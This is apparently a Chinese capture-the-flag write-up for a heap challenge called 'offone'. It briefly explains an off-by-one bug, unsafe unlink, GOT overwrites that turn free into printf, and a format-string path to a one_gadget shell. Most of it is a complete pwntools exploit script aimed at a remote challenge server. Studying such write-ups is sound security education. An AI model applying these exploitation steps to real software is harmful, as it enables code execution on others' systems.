这题其实就是一个off by one，关键就是在利用那里比较麻烦

因为在edit那里，是用strlen来判断长度的，所以可以修改下一个堆的size

这样常规的就是直接unsafe unlink，然后就可以任意写了

但是这里不同，因为edit那里最后一位必须为\x00，很多地方就写不了

想了半天，还是用老套路，将free的got表中的值修改为printf,然后利用格式化字符串漏洞就可以实现任意读写了

这里就准备将exit在got表中的值修改为one_gadget，但是发现，在本地能利用的那个gadget居然在服务器上失败了......

别的gadget条件又不满足，最后强行用格式化字符串漏洞将栈上的某个地方清0，然后满足了另外一个gadget的条件

（其实上面能利用的原因是因为这题的libc和once的libc是一样的

下面是具体的payload


```
from pwn import *

debug=0
context.log_level='debug'
e=ELF('./libc.so')

if debug:
    p=process('offone',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('47.75.154.113', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.sendline(x)


def new(idx,content):
    se('1')
    ru('Which? :')
    se(str(idx))
    ru('msg:')
    se(content)
    ru('Which? :')

def edit(idx,content):
    se('2')
    ru('Which? :')
    se(str(idx))
    ru('new msg:')
    p.send(content)
    ru('Which? :')

def wipe(idx):
    se('3')
    ru('Which? :')
    se(str(idx))
    return ru('Which? :')


def write_b(idx,c):
    new(10,'a'*0x60)
    edit(10,'%'+str(st+idx)+'c%6$hhn\n')
    wipe(10)
    new(10,'a'*0x60)
    if c!=0:
        edit(10,'%'+str(c)+'c%8$hhn\n')
    else:
        edit(10,'%8$hhn\n')
    wipe(10)

def write_one(addr,value,length=3):
    for i in range(length):
        write_b(length-1-i,ord(p64(addr)[length-1-i]))
    new(10,'a'*0x60)
    if value!=0:
        edit(10,'%'+str(value)+'c%12$hhn\n')
    else:
        edit(10,'%12$hhn\n')
    wipe(10)

def write(addr,value,length=3):
    tmp=p64(value)
    for i in range(6):
        write_one(addr+i,ord(tmp[i]),length)


new(0,'a'*0x60)
new(1,'b'*0x60)
new(2,'c'*0x60)

new(3,'a'*0x300)
wipe(3)

new(3,'\xff'*0x120)
new(4,'a'*0x190)
edit(4,p64(0x21)*0x24+'\n')

fake_chunk=p64(0)+p64(0xe1)+p64(0x602198-0x18)+p64(0x602198-0x10)
fake_chunk=fake_chunk.ljust(0xe0,'a')
fake_chunk+=p64(0xe0)

edit(3,fake_chunk+'\n')
wipe(4)

edit(3,p32(0x602018)[:3]+'\n')
edit(0,p64(0x4007a0)[:6])

edit(3,'\x00'*3)
wipe(0)
new(0,'a'*0x20)
edit(3,p32(0x602020)[:3]+'\n')

puts=u64(wipe(0)[:6]+'\x00\x00')

edit(3,'\x00'*3)
wipe(0)

base=puts-e.symbols['puts']

one_gadget=base+0x4526a

new(10,'a'*0x200)
edit(10,'%8$lx\n')

stack=int(wipe(10)[:12],16)
st=ord(p64(stack)[0])

write(0x602070,one_gadget,3)

for i in range(6):
    write_b(5-i,ord(p64(stack+0x18)[5-i]))    
new(10,'a'*0x60)
edit(10,'%12$n\n')
wipe(10)

for i in range(6):
    write_b(5-i,ord(p64(stack+0x18+4)[5-i]))
new(10,'a'*0x60)
edit(10,'%12$n\n')
wipe(10)

new(10,'a'*0x200)
edit(10,'%lx-'*0x20+'\n')
wipe(10)




print(hex(stack))

p.interactive()



```